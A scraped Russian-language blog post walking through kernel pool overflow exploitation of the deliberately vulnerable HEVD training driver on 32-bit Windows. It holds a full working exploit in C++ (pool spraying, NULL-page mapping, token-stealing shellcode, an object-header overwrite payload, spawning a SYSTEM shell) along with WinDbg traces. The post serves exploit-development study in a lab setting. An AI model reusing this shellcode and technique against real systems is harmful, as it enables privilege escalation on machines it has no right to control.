_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtAllocateVirtualMemory&quot;); INT64 address = 0x1; int size = 0x100; HANDLE result = (HANDLE)NtAllocateVirtualMemory( GetCurrentProcess(), (PVOID*)&amp;address, NULL, (PSIZE_T)&amp;size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (result == INVALID_HANDLE_VALUE) { cout &lt;&lt; &quot;[!] Unable to allocate NULL page...wtf?\\n&quot;; cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; dec &lt;&lt; GetLastError() &lt;&lt; &quot;\\n&quot;; exit(1); } cout &lt;&lt; &quot;[&gt;] NULL page mapped.\\n&quot;; cout &lt;&lt; &quot;[&gt;] Putting &#39;AAAA&#39; on NULL page...\\n&quot;; memset((void*)0x0, &#39;\\x41&#39;, 0x100); } Также заполним NULL страницу \\x42 значениями, чтобы, запустив этот код, мы получили Access Violation со значением 0x42424242 в eip И последнее, нам нужно освободить наши чанки, чтобы активировалась CloseProcedure void free_chunks() { cout &lt;&lt; &quot;[&gt;] Freeing defragmentation allocations...\\n&quot;; for (int i = 0; i &lt; defragment_handles.size(); i++) { BOOL freed = CloseHandle(defragment_handles[i]); if (freed == false) { cout &lt;&lt; &quot;[!] Unable to free defragment allocation!\\n&quot;; cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; GetLastError() &lt;&lt; &quot;\\n&quot;; exit(1); } } cout &lt;&lt; &quot;[&gt;] Defragmentation allocations freed.\\n&quot;; cout &lt;&lt; &quot;[&gt;] Freeing sequential allocations...\\n&quot;; for (int i = 0; i &lt; sequential_handles.size(); i++) { BOOL freed = CloseHandle(sequential_handles[i]); if (freed == false) { cout &lt;&lt; &quot;[!] Unable to free defragment allocation!\\n&quot;; cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; GetLastError() &lt;&lt; &quot;\\n&quot;; exit(1); } } cout &lt;&lt; &quot;[&gt;] Sequential allocations freed.\\n&quot;; } Где-то здесь я пришёл к выводу, что его код всё-таки хороший и идея раскидать всё по функция стоит того)))) kd&gt; g Breakpoint 0 hit HEVD!TriggerPoolOverflow: a815b12a 6a14 push 14h kd&gt; g Breakpoint 1 hit HEVD!TriggerPoolOverflow+0xe6: a815b210 686cc315a8 push offset HEVD! ?? ::NNGAKEGL::`string&#39; (a815c36c) kd&gt; g Access violation - code c0000005 (!!! second chance !!!) 41414141 ?? ??? Видим, что 0xC поменялся на 0x0 kd&gt; db 8756dd40-8 ReadVirtual: 8756dd38 not properly sign extended 8756dd38 42 42 42 42 42 42 42 42-40 00 08 04 45 76 65 ee BBBBBBBB@...Eve. 8756dd48 00 00 00 00 40 00 00 00-00 00 00 00 00 00 00 00 ....@........... 8756dd58 01 00 00 00 01 00 00 00-00 00 00 00 -&gt;00&lt;- 00 08 00 ................ 8756dd68 40 b2 eb 86 00 00 00 00-01 00 04 00 00 00 00 00 @............... 8756dd78 78 dd 56 87 78 dd 56 87-08 00 08 04 45 76 65 ee x.V.x.V.....Eve. 8756dd88 00 00 00 00 40 00 00 00-00 00 00 00 00 00 00 00 ....@........... 8756dd98 01 00 00 00 01 00 00 00-00 00 00 00 0c 00 08 00 ................ 8756dda8 40 b2 eb 86 00 00 00 00-01 00 04 00 00 00 00 00 @............... kd&gt; dd 0x00000000 00000000 41414141 41414141 41414141 41414141 00000010 41414141 41414141 41414141 41414141 Шеллкод kd&gt; k # ChildEBP RetAddr WARNING: Frame IP not in any known module. Following frames may be wrong. 00 a9f93ae8 82886565 0x41414141 01 a9f93b38 828b54a7 nt!ObpCloseHandleTableEntry+0x6d 02 a9f93b68 8289d617 nt!ExSweepHandleTable+0x5f 03 a9f93b88 828aa467 nt!ObKillProcess+0x54 04 a9f93bfc 8289d0fa nt!PspExitThread+0x5e4 05 a9f93c24 82679e06 nt!NtTerminateProcess+0x12e &lt;Intermediate frames may have been skipped due to lack of complete unwind&gt; 06 a9f93c24 77ab6c74 (T) nt!KiSystemServicePostCall &lt;Intermediate frames may have been skipped due to lack of complete unwind&gt; 07 0030f9b0 7754be67 (T) 0x77ab6c74 08 0030f9c4 6e33603d 0x7754be67 09 0030fa18 6e3361b1 0x6e33603d 0a 0030fa24 00021a10 0x6e3361b1 0b 0030fa40 00021a57 0x21a10 0c 0030fa4c 00023007 0x21a57 0d 0030fa94 7753ef8c 0x23007 0e 0030faa0 77ad367a 0x7753ef8c 0f 0030fae0 77ad364d 0x77ad367a 10 0030faf8 00000000 0x77ad364d 8288650d 0fb64e0c movzx ecx,byte ptr [esi+0Ch] 82886511 8b1c8de02e7882 mov ebx,dword ptr nt!ObTypeIndexTable (82782ee0)[ecx*4] 82886518 57 push edi 82886519 648b3d24010000 mov edi,dword ptr fs:[124h] 82886520 837b7400 cmp dword ptr [ebx+74h],0 82886524 8d4e18 lea ecx,[esi+18h] 82886527 894c2414 mov dword ptr [esp+14h],ecx 8288652b c644241300 mov byte ptr [esp+13h],0 82886530 0f8497000000 je nt!ObpCloseHandleTableEntry+0xd5 (828865cd) 82886536 648b0d24010000 mov ecx,dword ptr fs:[124h] 8288653d 8b4510 mov eax,dword ptr [ebp+10h] 82886540 394150 cmp dword ptr [ecx+50h],eax 82886543 7410 je nt!ObpCloseHandleTableEntry+0x5d (82886555) 82886545 8d4c2420 lea ecx,[esp+20h] 82886549 51 push ecx 8288654a 50 push eax 8288654b e8c71ce5ff call nt!KeStackAttachProcess (826d8217) 82886550 c644241301 mov byte ptr [esp+13h],1 82886555 ff7518 push dword ptr [ebp+18h] 82886558 ff7514 push dword ptr [ebp+14h] 8288655b ff74241c push dword ptr [esp+1Ch] 8288655f ff7510 push dword ptr [ebp+10h] 82886562 ff5374 call dword ptr [ebx+74h] 82886565 84c0 test al,al 82886567 7561 jne nt!ObpCloseHandleTableEntry+0xd2 (828865ca) Видим пуши, которые нужно будет компенсировать попом в конце шеллкода kd&gt; dd 0x0 00000000 00000000 00000000 00000000 00000000 00000010 00000000 00000000 00000000 00000000 00000020 00000000 00000000 00000000 00000000 00000030 00000000 00000000 00000000 00000000 00000040 00000000 00000000 00000000 00000000 00000050 00000000 00000000 00000000 00000000 00000060 00060000 00000000 00000000 00000000 00000070 00000000 00000000 00000000 00000000 kd&gt; u 00060000 L15 00060000 60 pushad 00060001 64a124010000 mov eax,dword ptr fs:[00000124h] 00060007 8b4050 mov eax,dword ptr [eax+50h] 0006000a 89c1 mov ecx,eax 0006000c 8b98f8000000 mov ebx,dword ptr [eax+0F8h] 00060012 ba04000000 mov edx,4 00060017 8b80b8000000 mov eax,dword ptr [eax+0B8h] 0006001d 2db8000000 sub eax,0B8h 00060022 3990b4000000 cmp dword ptr [eax+0B4h],edx 00060028 75ed jne 00060017 0006002a 8b90f8000000 mov edx,dword ptr [eax+0F8h] 00060030 8991f8000000 mov dword ptr [ecx+0F8h],edx 00060036 61 popad 00060037 c21000 ret 10h 0006003a 0000 add byte ptr [eax],al 0006003c 0000 add byte ptr [eax],al 0006003e 0000 add byte ptr [eax],al 00060040 0000 add byte ptr [eax],al 00060042 0000 add byte ptr [eax],al 00060044 0000 add byte ptr [eax],al 00060046 0000 add byte ptr [eax],al Полный код #include &lt;iostream&gt; #include &lt;vector&gt; #include &lt;Windows.h&gt; using namespace std; #define DEVICE_NAME &quot;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver&quot; #define IOCTL 0x22200F typedef NTSTATUS(WINAPI* _NtAllocateVirtualMemory)( HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T AllocationSize, ULONG AllocationType, ULONG Protect ); vector&lt;HANDLE&gt; defragment_handles; vector&lt;HANDLE&gt; sequential_handles; HANDLE grab_handle() { HANDLE hFile = CreateFileA(DEVICE_NAME, FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { cout &lt;&lt; &quot;[!] No handle to HackSysExtremeVulnerableDriver\\n&quot;; exit(1); } cout &lt;&lt; &quot;[&gt;] Grabbed handle to HackSysExtremeVulnerableDriver: &quot; &lt;&lt; hex &lt;&lt; hFile &lt;&lt; &quot;\\n&quot;; return hFile; } void spray_pool() { cout &lt;&lt; &quot;[&gt;] Spraying pool to defragment...\\n&quot;; for (int i = 0; i &lt; 10000; i++) { HANDLE result = CreateEvent(NULL, 0, 0, L&quot;&quot;); if (!result) { cout &lt;&lt; &quot;[!] Error allocating Event Object during defragmentation\\n&quot;; exit(1); } defragment_handles.push_back(result); } cout &lt;&lt; &quot;[&gt;] Defragmentation spray complete.\\n&quot;; cout &lt;&lt; &quot;[&gt;] Spraying sequential allocations...\\n&quot;; for (int i = 0; i &lt; 10000; i++) { HANDLE result = CreateEvent(NULL, 0, 0, L&quot;&quot;); if (!result) { cout &lt;&lt; &quot;[!] Error allocating Event Object during sequential.\\n&quot;; exit(1); } sequential_handles.push_back(result); } cout &lt;&lt; &quot;[&gt;] Sequential spray complete.\\n&quot;; cout &lt;&lt; &quot;[&gt;] Poking 0x200 byte-sized holes in our sequential allocation...\\n&quot;; for (int i = 0; i &lt; sequential_handles.size(); i = i + 0x16) { for (int x = 0; x &lt; 8; x++) { BOOL freed = CloseHandle(sequential_handles[i + x]); if (freed == false) { cout &lt;&lt; &quot;[!] Unable to free sequential allocation!\\n&quot;; cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; GetLastError() &lt;&lt; &quot;\\n&quot;; exit(1); } } } cout &lt;&lt; &quot;[&gt;] Holes poked lol.\\n&quot;; } void allocate_shellcode() { _NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtAllocateVirtualMemory&quot;); INT64 address = 0x1; int size = 0x100; HANDLE result = (HANDLE)NtAllocateVirtualMemory( GetCurrentProcess(), (PVOID*)&amp;address, NULL, (PSIZE_T)&amp;size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (result == INVALID_HANDLE_VALUE) { cout &lt;&lt; &quot;[!] Unable to allocate NULL page...wtf?\\n&quot;; cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; dec &lt;&lt; GetLastError() &lt;&lt; &quot;\\n&quot;; exit(1); } cout &lt;&lt; &quot;[&gt;] NULL page mapped.\\n&quot;; cout &lt;&lt; &quot;[&gt;] Placing pointer to shellcode on NULL page at offset 0x60...\\n&quot;; BYTE shellcode[] = ( &quot;\\x60&quot; &quot;\\x64\\xA1\\x24\\x01\\x00\\x00&quot; &quot;\\x8B\\x40\\x50&quot; &quot;\\x89\\xC1&quot; &quot;\\x8B\\x98\\xF8\\x00\\x00\\x00&quot; &quot;\\xBA\\x04\\x00\\x00\\x00&quot; &quot;\\x8B\\x80\\xB8\\x00\\x00\\x00&quot; &quot;\\x2D\\xB8\\x00\\x00\\x00&quot; &quot;\\x39\\x90\\xB4\\x00\\x00\\x00&quot; &quot;\\x75\\xED&quot; &quot;\\x8B\\x90\\xF8\\x00\\x00\\x00&quot; &quot;\\x89\\x91\\xF8\\x00\\x00\\x00&quot; &quot;\\x61&quot; &quot;\\xC2\\x10\\x00&quot; // ret 0x10 ); LPVOID shellcode_addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(shellcode_addr, shellcode, sizeof(shellcode)); memset((void*)0x0, &#39;\\x00&#39;, 0x100); memcpy((void*)0x60, (void*)&amp;shellcode_addr, 0x4); } void send_payload(HANDLE hFile) { ULONG payload_len = 0x220; BYTE* input_buff = (BYTE*)VirtualAlloc(NULL, payload_len + 0x1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); BYTE overwrite_payload[] = ( &quot;\\x40\\x00\\x08\\x04&quot; // pool header &quot;\\x45\\x76\\x65\\xee&quot; // pool tag &quot;\\x00\\x00\\x00\\x00&quot; // obj header quota begin &quot;\\x40\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x00\\x00&quot; // obj header quota end &quot;\\x01\\x00\\x00\\x00&quot; // obj header begin &quot;\\x01\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x00\\x00&quot; &quot;\\x00\\x00\\x08\\x00&quot; // 0xc converted to 0x0 ); memset(input_buff, &#39;\\x41&#39;, 0x1F8); memcpy(input_buff + 0x1F8, overwrite_payload, 0x28); cout &lt;&lt; &quot;[&gt;] Sending buffer size of: &quot; &lt;&lt; dec &lt;&lt; payload_len &lt;&lt; &quot;\\n&quot;; DWORD bytes_ret = 0; int result = DeviceIoControl(hFile, IOCTL, input_buff, payload_len, NULL, 0, &amp;bytes_ret, NULL); if (!result) { cout &lt;&lt; &quot;[!] DeviceIoControl failed!\\n&quot;; } } void free_chunks() { cout &lt;&lt; &quot;[&gt;] Freeing defragmentation allocations...\\n&quot;; for (int i = 0; i &lt; defragment_handles.size(); i++) { BOOL freed = CloseHandle(defragment_handles[i]); if (freed == false) { //cout &lt;&lt; &quot;[!] Unable to free defragment allocation!\\n&quot;; //cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; GetLastError() &lt;&lt; &quot;\\n&quot;; //exit(1); } } cout &lt;&lt; &quot;[&gt;] Defragmentation allocations freed.\\n&quot;; cout &lt;&lt; &quot;[&gt;] Freeing sequential allocations...\\n&quot;; for (int i = 0; i &lt; sequential_handles.size(); i++) { BOOL freed = CloseHandle(sequential_handles[i]); if (freed == false) { //cout &lt;&lt; &quot;[!] Unable to free defragment allocation!\\n&quot;; //cout &lt;&lt; &quot;[!] Last error: &quot; &lt;&lt; GetLastError() &lt;&lt; &quot;\\n&quot;; //exit(1); } } cout &lt;&lt; &quot;[&gt;] Sequential allocations freed.\\n&quot;; } void spawn_shell() { cout &lt;&lt; &quot;[&gt;] Spawning nt authority/system shell...\\n&quot;; PROCESS_INFORMATION pi; ZeroMemory(&amp;pi, sizeof(pi)); STARTUPINFOA si; ZeroMemory(&amp;si, sizeof(si)); CreateProcessA(&quot;C:\\\\Windows\\\\System32\\\\cmd.exe&quot;, NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi); } int main() { HANDLE hFile = grab_handle(); spray_pool(); allocate_shellcode(); send_payload(hFile); free_chunks(); spawn_shell(); return 0; }","headline":"Windows Kernel Exploitation 0x03 Pool Overflow [ru]","image":"/assets/previews/13.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"/2022/10/11/Windows-Kernel-Exploitation-0x03.html"},"url":"/2022/10/11/Windows-Kernel-Exploitation-0x03.html"}</script>
<!-- End Jekyll SEO tag -->

</head>

<link href="assets/favicon.ico" rel="icon" type="image/x-icon" />

<body>
  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    <link rel="shortcut icon" href="/assets/favicon.ico">
    
    <h1>truebad0ur@home:~$</h1>
    </a>
    <div class="header-links">
      <a href="/archive.html"><h2 class="header-link">Archive</h2></a>
<a href="/about.html"><h2 class="header-link">About</h2></a>
<a href="/ToDo.html"><h2 class="header-link">ToDo</h2></a>
<a href="/Certificates.html"><h2 class="header-link">Certificates</h2></a>
<!--<a href="https://t.me/reverse_dungeon"><h2 class="header-link">Telegram</h2></a>-->

    </div>
  </div>
</header>

    <div class="container">
      <section id="main_content">
        <article>
  <p>будет перевод <a href="https://rootkits.xyz/blog/2017/11/kernel-pool-overflow">вот этой статейки</a>
И ещё <a href="https://h0mbre.github.io/HEVD_Pool_Overflow_32bit/">вот этой</a></p>

<h2 id="pool-feng-shui"><a href="#header-2"></a>Pool Feng-Shui</h2>

<p>Перед тем как мы погрузимся в Pool Overflow, нам нужно понять базу пула, как его использовать для наших целей. Действительно <a href="https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf">хорошая статья</a> по этому поводу есть у Tarjei Mandt. Настоятельно рекумендуется прочитать её перед тем, как идти дальше</p>

<p>Ядерный пул очень похож на кучу Windows, так как он используется для хранения динамических аллокаций памяти. Как и Heap Spray для подготовки(?) к обычным приложениям, в пространстве ядра нам нужно найти способ подготовки(?) пула таким образом, чтобы мы могли предсказуемо вызвать наш шеллкод из памяти. Очень важно понимать концепцию аллокатора пула и как работает механизм аллокации и деаллокации пула.</p>

<p>Для нашего HEVD драйвера уязвимый пользовательский буфер аллоциется в невыгружемом пуле, так что нам нужно найти технику для грума(?) невыгружаемого пула. Windows предоставляет объект события, который хранится в невыгружаемом пуле и может быть создан с помощью CreateEvent:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HANDLE</span> <span class="n">WINAPI</span> <span class="nf">CreateEvent</span><span class="p">(</span>
  <span class="n">_In_opt_</span> <span class="n">LPSECURITY_ATTRIBUTES</span> <span class="n">lpEventAttributes</span><span class="p">,</span>
  <span class="n">_In_</span>     <span class="n">BOOL</span>                  <span class="n">bManualReset</span><span class="p">,</span>
  <span class="n">_In_</span>     <span class="n">BOOL</span>                  <span class="n">bInitialState</span><span class="p">,</span>
  <span class="n">_In_opt_</span> <span class="n">LPCTSTR</span>               <span class="n">lpName</span>
<span class="p">);</span>
</code></pre></div></div>

<p>Здесь нам нужно создать два больших массива объектов события с помощью этого апи и затем создать дыры в этом аллоцированном чанке с помощью освобождения некоторых из объектов события в одном из массивов, используя CloseHandle, которые после объединения объединятся в большее большие свободные чанки:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">CloseHandle</span><span class="p">(</span>
  <span class="n">_In_</span> <span class="n">HANDLE</span> <span class="n">hObject</span>
<span class="p">);</span>
</code></pre></div></div>

<p>В эти свободные чанки нам нужно будет вставить наш уязвимый пользовательский буфер таким образом, чтобы он надежно перезаписывал нужную область памяти каждый раз, как мы будем “портить” соседний заголовок объекта события, чтобы перенаправить поток выполнения на наш шеллкод.</p>

<p>После этого мы положим указатель на наш шеллкод таким образом, чтобы он мог быть вызван с помощью манипуляций нашим покоррапченным заголовком. Мы будем фейкать заголовок OBJECT_TYPE, переписывая указатель на одну из процедур в OBJECT_TYPE_INITIALIZER</p>

<p>В <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/BufferOverflowNonPagedPool.c">сорцах</a> видим то же: нет проверким на длину переданного буфера.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">__try</span> <span class="p">{</span>
        <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[+] Allocating Pool chunk</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
 
        <span class="c1">// Allocate Pool chunk</span>
        <span class="n">KernelBuffer</span> <span class="o">=</span> <span class="n">ExAllocatePoolWithTag</span><span class="p">(</span><span class="n">NonPagedPool</span><span class="p">,</span>
                                             <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">POOL_BUFFER_SIZE</span><span class="p">,</span>
                                             <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">POOL_TAG</span><span class="p">);</span>
 
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">KernelBuffer</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// Unable to allocate Pool chunk</span>
            <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[-] Unable to allocate Pool chunk</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
 
            <span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_NO_MEMORY</span><span class="p">;</span>
            <span class="k">return</span> <span class="n">Status</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
            <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[+] Pool Tag: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">STRINGIFY</span><span class="p">(</span><span class="n">POOL_TAG</span><span class="p">));</span>
            <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[+] Pool Type: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">STRINGIFY</span><span class="p">(</span><span class="n">NonPagedPool</span><span class="p">));</span>
            <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[+] Pool Size: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">POOL_BUFFER_SIZE</span><span class="p">);</span>
            <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[+] Pool Chunk: 0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">KernelBuffer</span><span class="p">);</span>
        <span class="p">}</span>
 
        <span class="c1">// Verify if the buffer resides in user mode</span>
        <span class="n">ProbeForRead</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">POOL_BUFFER_SIZE</span><span class="p">,</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">__alignof</span><span class="p">(</span><span class="n">UCHAR</span><span class="p">));</span>
 
        <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[+] UserBuffer: 0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">);</span>
        <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[+] UserBuffer Size: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
        <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[+] KernelBuffer: 0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">KernelBuffer</span><span class="p">);</span>
        <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[+] KernelBuffer Size: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">POOL_BUFFER_SIZE</span><span class="p">);</span>
 
<span class="cp">#ifdef SECURE
</span>        <span class="c1">// Secure Note: This is secure because the developer is passing a size</span>
        <span class="c1">// equal to size of the allocated Pool chunk to RtlCopyMemory()/memcpy().</span>
        <span class="c1">// Hence, there will be no overflow</span>
        <span class="n">RtlCopyMemory</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">,</span> <span class="p">(</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">POOL_BUFFER_SIZE</span><span class="p">);</span>
<span class="cp">#else
</span>        <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[+] Triggering Pool Overflow</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
 
        <span class="c1">// Vulnerability Note: This is a vanilla Pool Based Overflow vulnerability</span>
        <span class="c1">// because the developer is passing the user supplied value directly to</span>
        <span class="c1">// RtlCopyMemory()/memcpy() without validating if the size is greater or</span>
        <span class="c1">// equal to the size of the allocated Pool chunk</span>
        <span class="n">RtlCopyMemory</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
</code></pre></div></div>

<p>Снова пишем сплойт, ставим бряку и смотрим:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="cp">#define IO_CODE 0x22200f
</span>
<span class="k">const</span> <span class="kt">char</span> <span class="n">kDevName</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Calling CreateFileA() to obtain a handle to driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFileA</span><span class="p">(</span><span class="n">kDevName</span><span class="p">,</span>
        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="n">OPEN_EXISTING</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
        <span class="nb">NULL</span>
    <span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Error - dailed to get file handle!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">system</span><span class="p">(</span><span class="s">"pause"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Successfully obtained a handle to the driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">poc</span> <span class="o">=</span> <span class="s">"AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp"</span><span class="p">;</span>
    <span class="c1">//printf("%d", sizeof(poc));</span>
    <span class="n">DWORD</span> <span class="n">bytesRetn</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Starting interaction with the driver</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IO_CODE</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">poc</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesRetn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="c1">//system("cmd.exe");</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">in</span> <span class="nx">windbg</span><span class="p">:</span>
<span class="nx">ed</span> <span class="nx">nt</span><span class="o">!</span><span class="nx">Kd_Default_Mask</span> <span class="mi">8</span>

<span class="p">.</span><span class="nx">sympath</span><span class="o">+</span> <span class="nx">location_of_HEVD_pdb</span>
<span class="p">.</span><span class="nx">reload</span> 
<span class="p">.</span><span class="nx">reload</span> <span class="o">/</span><span class="nx">f</span>

<span class="nx">bp</span> <span class="nx">HEVD</span><span class="o">!</span><span class="nx">TriggerPoolOverflow</span>
<span class="nx">bp</span> <span class="nx">HEVD</span><span class="o">!</span><span class="nx">TriggerPoolOverflow</span><span class="o">+</span><span class="nx">e6</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">kd</span><span class="o">&gt;</span> <span class="nx">g</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Allocating</span> <span class="nx">Pool</span> <span class="nx">chunk</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Tag</span><span class="p">:</span> <span class="dl">'</span><span class="s1">kcaH</span><span class="dl">'</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Type</span><span class="p">:</span> <span class="nx">NonPagedPool</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Size</span><span class="p">:</span> <span class="mh">0x1F8</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Chunk</span><span class="p">:</span> <span class="mh">0x8509E008</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UserBuffer</span><span class="p">:</span> <span class="mh">0x012721B0</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">UserBuffer</span> <span class="nx">Size</span><span class="p">:</span> <span class="mh">0x64</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">KernelBuffer</span><span class="p">:</span> <span class="mh">0x8509E008</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">KernelBuffer</span> <span class="nx">Size</span><span class="p">:</span> <span class="mh">0x1F8</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Triggering</span> <span class="nx">Pool</span> <span class="nx">Overflow</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Freeing</span> <span class="nx">Pool</span> <span class="nx">chunk</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Pool</span> <span class="nx">Tag</span><span class="p">:</span> <span class="dl">'</span><span class="s1">kcaH</span><span class="dl">'</span>
